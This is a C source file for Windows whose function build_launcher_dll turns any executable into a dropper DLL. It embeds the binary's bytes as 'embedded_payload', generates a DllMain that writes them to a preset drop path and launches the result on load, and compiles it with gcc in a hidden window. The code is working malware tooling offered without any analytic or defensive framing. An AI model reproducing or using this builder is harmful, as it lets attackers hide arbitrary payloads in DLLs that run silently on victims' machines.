#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "config.h"

static void append_quoted_argument(char **cursor, const char *argument)
{
    const unsigned char *p = (const unsigned char *)argument;
    *(*cursor)++ = '"';

    while (*p != '\0') {
        size_t slashes = 0;

        while (*p == '\\') {
            ++slashes;
            ++p;
        }

        if (*p == '"') {
            size_t i;
            for (i = 0; i < slashes * 2 + 1; ++i)
                *(*cursor)++ = '\\';
            *(*cursor)++ = '"';
            ++p;
        } else if (*p == '\0') {
            size_t i;
            for (i = 0; i < slashes * 2; ++i)
                *(*cursor)++ = '\\';
            break;
        } else {
            size_t i;
            for (i = 0; i < slashes; ++i)
                *(*cursor)++ = '\\';
            *(*cursor)++ = (char)*p++;
        }
    }

    *(*cursor)++ = '"';
    **cursor = '\0';
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    unsigned char *binary_data = NULL;
    SIZE_T data_size = 0;
    SIZE_T offset;
    DWORD temp_path_len;
    char temp_dir[MAX_PATH];
    char source_path[MAX_PATH];
    char *extension;
    FILE *source = NULL;
    const unsigned char *drop_path_bytes;
    size_t drop_path_len;
    size_t command_capacity;
    char *command_line = NULL;
    char *command_cursor;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    DWORD wait_result;
    DWORD exit_code;
    int result = -1;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0')
        return -1;

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX)
        goto cleanup;

    data_size = (SIZE_T)file_size.QuadPart;
    binary_data = (unsigned char *)malloc(data_size == 0 ? 1 : data_size);
    if (binary_data == NULL)
        goto cleanup;

    offset = 0;
    while (offset < data_size) {
        DWORD amount = (data_size - offset > 1024U * 1024U)
                           ? 1024U * 1024U
                           : (DWORD)(data_size - offset);
        DWORD received = 0;
        if (!ReadFile(input, binary_data + offset, amount, &received, NULL) ||
            received == 0)
            goto cleanup;
        offset += received;
    }

    CloseHandle(input);
    input = INVALID_HANDLE_VALUE;

    temp_path_len = GetTempPathA((DWORD)sizeof(temp_dir), temp_dir);
    if (temp_path_len == 0 || temp_path_len >= sizeof(temp_dir) ||
        GetTempFileNameA(temp_dir, "ldl", 0, source_path) == 0)
        goto cleanup;

    if (!DeleteFileA(source_path))
        goto cleanup;

    extension = strrchr(source_path, '.');
    if (extension == NULL || (size_t)(extension - source_path) + 3 >= sizeof(source_path))
        goto cleanup;
    strcpy(extension, ".c");

    source = fopen(source_path, "wb");
    if (source == NULL)
        goto cleanup;

    if (fputs("#include <windows.h>\n"
              "static const unsigned char embedded_payload[] = {",
              source) == EOF)
        goto cleanup;

    if (data_size == 0) {
        if (fputs("0", source) == EOF)
            goto cleanup;
    } else {
        for (offset = 0; offset < data_size; ++offset) {
            if (offset % 16 == 0 && fputs("\n", source) == EOF)
                goto cleanup;
            if (fprintf(source, "0x%02X,", (unsigned int)binary_data[offset]) < 0)
                goto cleanup;
        }
    }

    if (fprintf(source,
                "\n};\n"
                "static const unsigned long long embedded_payload_size = %lluULL;\n"
                "static const char drop_path[] = {",
                (unsigned long long)data_size) < 0)
        goto cleanup;

    drop_path_bytes = (const unsigned char *)DROP_PATH;
    drop_path_len = strlen(DROP_PATH);
    for (offset = 0; offset < drop_path_len; ++offset) {
        if (fprintf(source, "0x%02X,", (unsigned int)drop_path_bytes[offset]) < 0)
            goto cleanup;
    }

    if (fputs(
            "0};\n"
            "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
            "{\n"
            "    (void)instance;\n"
            "    (void)reserved;\n"
            "    if (reason == DLL_PROCESS_ATTACH) {\n"
            "        HANDLE file = CreateFileA(drop_path, GENERIC_WRITE, 0, NULL,\n"
            "                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
            "        if (file != INVALID_HANDLE_VALUE) {\n"
            "            unsigned long long position = 0;\n"
            "            while (position < embedded_payload_size) {\n"
            "                DWORD amount = (embedded_payload_size - position > 0x40000000ULL)\n"
            "                                   ? 0x40000000UL\n"
            "                                   : (DWORD)(embedded_payload_size - position);\n"
            "                DWORD written = 0;\n"
            "                if (!WriteFile(file, embedded_payload + (SIZE_T)position,\n"
            "                               amount, &written, NULL) || written == 0)\n"
            "                    break;\n"
            "                position += written;\n"
            "            }\n"
            "            CloseHandle(file);\n"
            "        }\n"
            "        {\n"
            "            STARTUPINFOA startup;\n"
            "            PROCESS_INFORMATION process;\n"
            "            ZeroMemory(&startup, sizeof(startup));\n"
            "            ZeroMemory(&process, sizeof(process));\n"
            "            startup.cb = sizeof(startup);\n"
            "            if (CreateProcessA(drop_path, NULL, NULL, NULL, FALSE, 0,\n"
            "                               NULL, NULL, &startup, &process)) {\n"
            "                CloseHandle(process.hThread);\n"
            "                CloseHandle(process.hProcess);\n"
            "            }\n"
            "        }\n"
            "    }\n"
            "    return TRUE;\n"
            "}\n",
            source) == EOF)
        goto cleanup;

    if (fclose(source) != 0) {
        source = NULL;
        goto cleanup;
    }
    source = NULL;

    if (strlen(dll_out_path) > (SIZE_MAX - 128) / 2 ||
        strlen(source_path) > (SIZE_MAX - 128 - strlen(dll_out_path) * 2) / 2)
        goto cleanup;

    command_capacity = 128 + strlen(dll_out_path) * 2 + strlen(source_path) * 2;
    command_line = (char *)malloc(command_capacity);
    if (command_line == NULL)
        goto cleanup;

    command_cursor = command_line;
    strcpy(command_cursor, "gcc -m64 -shared -O2 -o ");
    command_cursor += strlen(command_cursor);
    append_quoted_argument(&command_cursor, dll_out_path);
    *command_cursor++ = ' ';
    append_quoted_argument(&command_cursor, source_path);

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info))
        goto cleanup;

    wait_result = WaitForSingleObject(process_info.hProcess, INFINITE);
    if (wait_result == WAIT_OBJECT_0 &&
        GetExitCodeProcess(process_info.hProcess, &exit_code) &&
        exit_code == 0)
        result = 0;

    CloseHandle(process_info.hThread);
    CloseHandle(process_info.hProcess);

cleanup:
    if (source != NULL)
        fclose(source);
    if (source_path[0] != '\0')
        DeleteFileA(source_path);
    if (input != INVALID_HANDLE_VALUE)
        CloseHandle(input);
    free(binary_data);
    free(command_line);
    return result;
}